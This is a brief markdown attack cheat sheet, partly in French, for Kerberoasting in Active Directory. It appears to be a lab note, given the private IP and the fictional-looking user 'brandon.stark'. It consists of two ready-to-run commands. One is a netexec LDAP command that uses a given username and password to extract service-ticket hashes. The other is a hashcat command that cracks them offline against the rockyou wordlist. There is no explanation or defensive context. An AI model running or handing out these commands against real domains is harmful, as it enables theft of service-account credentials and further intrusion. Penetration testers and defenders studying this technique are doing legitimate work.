# Kerberoasting

## Extraction

```bash
nxc ldap 192.168.56.11 -u 'brandon.stark' -p 'iseedeadpeople' --kerberoasting kerberoasting.txt
```

## Cracker les hashs hors-ligne

```bash
hashcat -m13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
```
